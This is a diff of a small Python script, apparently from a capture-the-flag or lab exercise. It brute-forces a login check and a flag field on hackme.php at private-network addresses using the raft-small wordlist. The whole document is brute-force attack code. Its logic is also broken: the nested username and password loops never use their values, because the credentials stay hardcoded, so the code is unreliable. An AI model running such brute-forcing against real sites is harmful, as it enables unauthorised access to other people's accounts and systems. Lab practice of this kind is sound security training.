@@ -4,25 +4,34 @@ lines = []
 with open("raft-small.txt", "r") as raft:
     lines = raft.readlines()
 
+
 s = requests.Session()
 
-credentials = {
- "username":"admin",
- "password":"admin"
-}
+for username in lines:
+    username = username.strip()
+    for password in lines:
+        password = password.strip()
 
-response = s.post("http://192.168.228.54/check.php", data=credentials)
-print(response.text)
+        credentials = {
+            "login_field": "cgi-bin",
+            "cred_field": "ebay"
+        }
 
-#response1 = s.post("http://192.168.228.54/hackme.php", data=credentials)
-#print(response1.text)
+        #response = s.post("http://172.25.0.32/index.php", data=credentials)
+        #pagetext = response.text
 
-for i in lines:
-    mydata = {"flag_value":i.replace("\n","")}
+        response2 = s.post("http://172.25.0.32/check.php", data=credentials)
+        pagetext2 = response2.text
 
-    response2 = s.post("http://192.168.228.54/hackme.php", data=mydata)
+        #if "Bad Credentials!" not in pagetext2:
+            #print(response2.text)
+            #print(credentials)
+        for i in lines:
+            mydata = {"new_flag":i.replace("\n","")}
 
-    currentPageText = response2.text
+            response2 = s.post("http://172.25.0.32/hackme.php", data=mydata)
 
-    if "brute-force" not in currentPageText:
-        print(response2.text)
+            currentPageText = response2.text
+
+            if "brute-force" not in currentPageText:
+                print(response2.text)
